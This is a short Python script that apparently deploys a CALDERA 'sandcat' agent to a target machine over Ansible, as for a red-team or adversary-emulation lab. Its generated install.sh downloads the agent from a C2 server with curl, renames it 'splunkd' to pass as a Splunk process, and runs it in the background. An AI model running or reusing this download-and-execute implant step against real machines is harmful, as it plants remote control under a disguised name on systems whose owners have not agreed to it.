import argparse
from AnsibleRunner import AnsibleRunner
from os import getcwd, chmod
import stat

def install(target_ip, server_ip, ssh_key, ansible_dir = 'ansible/caldera'):
    # Initialize inventory
    with open(f"{ansible_dir}/inventory", 'w') as inv_o:
        inv_o.write(f"[nodes]\n{target_ip}")
    
    # Initialize installation script
    cmd = f"#!/bin/bash\nserver='http://{server_ip}:8888';curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v &"

    with open('install.sh', 'w') as install_o:
        install_o.write(cmd)

    # Get location of installer script
    installer_path = getcwd() + "/install.sh"

    #Mark script as executable
    chmod(installer_path, stat.S_IEXEC | stat.S_IREAD | stat.S_IWRITE)

    # Begin Ansible Runner
    ansible_runner = AnsibleRunner(ssh_key, target_ip, ansible_dir)

    remote_cmd = "~/install.sh"
    params = {'remote_path': remote_cmd, 'local_path': installer_path}
    r = ansible_runner.run_playbook('install.yml', playbook_params=params)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', help = 'IP address of target machine', required = True)
    parser.add_argument('-s', '--ssh_key', help = 'The path to your openstack ssh key', required = True)
    parser.add_argument('-c', '--caldera_ip', help = 'IP address of caldera machine', required=True)
    args = parser.parse_args()

    install(args.target_ip, args.caldera_ip, args.ssh_key)

